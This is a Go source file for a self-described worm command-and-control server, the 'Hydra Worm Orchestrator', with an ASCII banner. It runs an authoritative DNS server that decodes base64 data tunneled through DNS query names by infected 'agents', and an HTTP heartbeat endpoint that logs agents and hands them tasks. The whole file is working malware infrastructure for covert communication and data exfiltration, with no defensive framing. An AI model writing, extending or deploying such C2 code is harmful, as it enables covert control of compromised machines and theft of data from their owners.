package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
)

// The root domain we are authoritative for
const rootDomain = "c2.hydra-worm.local."

// Heartbeat represents the data structure expected from the Rust Agent
type Heartbeat struct {
	AgentID   string  `json:"agent_id"`
	Transport string  `json:"transport"`
	Status    string  `json:"status"`
	Lambda    float64 `json:"lambda"`
}

func displaySplash() {
	// Concatenation handles the backtick in the ASCII art
	banner := `
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ ` + "`" + `   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ ` + "`" + `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    W O R M  -  O R C H E S T R A T O R`

	fmt.Println(banner)
	fmt.Printf("\n      [ Phase 1.5 - Multi-Transport Orchestrator Active ]\n")
	fmt.Printf("      [ HTTP:8080 | DNS:53 | Time: %s ]\n\n", time.Now().Format(time.RFC822))
}

// parseHydraDNS handles incoming DNS Tunneling heartbeats
func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		// 1. Get the raw name (case-preserved) and remove trailing dot
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")

		// 2. Perform a case-insensitive check for our root domain
		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			
			// 3. Extract the payload portion BEFORE the root domain
			// We MUST use the rawName here to preserve Base64 casing
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			
			// 4. Remove the label-separating dots
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
			
			// 5. Restore Base64 Padding
			if i := len(encodedPayload) % 4; i != 0 {
				encodedPayload += strings.Repeat("=", 4-i)
			}

			// 6. Decode (Using URLEncoding to match Rust's URL_SAFE)
			decoded, err := base64.URLEncoding.DecodeString(encodedPayload)
			if err != nil {
				// Fallback to standard if URLSafe fails
				decoded, err = base64.StdEncoding.DecodeString(encodedPayload)
				if err != nil {
					log.Printf("[-] DNS Decode Error: %v", err)
					continue
				}
			}

			fmt.Printf("\n[%s] 📡 DNS TUNNEL RECEIVED\n", time.Now().Format("15:04:05"))
			fmt.Printf("[+] FROM: %s\n", q.Name) // Raw name for logging
			fmt.Printf("[+] DATA: %s\n", string(decoded))
		}
	}
	w.WriteMsg(msg)
}

func startDNSServer() {
	dns.HandleFunc(rootDomain, parseHydraDNS)
	server := &dns.Server{Addr: ":53", Net: "udp"}
	log.Printf("[+] Starting DNS server on :53")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("[-] DNS Server Failed: %v", err)
	}
}

func main() {
	displaySplash()

	// Start DNS listener in background
	go startDNSServer()

	// Setup HTTP listener
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var hb Heartbeat
		if err := c.ShouldBindJSON(&hb); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid telemetry"})
			return
		}

		fmt.Printf("[%s] HTTP HB   | Agent: %-15s | Transport: %-18s\n",
			time.Now().Format("15:04:05"), hb.AgentID, hb.Transport)

		c.JSON(http.StatusOK, gin.H{
			"status": "acknowledged", 
			"task": "SLEEP", 
			"epoch": time.Now().Unix(),
		})
	})

	log.Fatal(r.Run(":8080"))
}